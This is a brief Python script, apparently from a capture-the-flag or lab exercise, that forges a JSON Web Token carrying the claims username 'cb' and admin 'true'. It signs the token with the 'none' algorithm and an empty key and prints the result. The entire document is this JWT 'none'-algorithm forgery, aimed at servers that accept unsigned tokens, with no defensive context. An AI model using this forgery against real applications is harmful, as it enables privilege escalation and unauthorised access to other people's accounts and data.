import jwt

# Manually create a JWT with specified claims (user and admin status)
payload_info = {'username': 'cb', 'admin': 'true'}

# Generate the token without a secret key (using 'none' algorithm)
generated_token = jwt.encode(payload_info, '', algorithm='none')

# Display the generated JWT token
print(generated_token)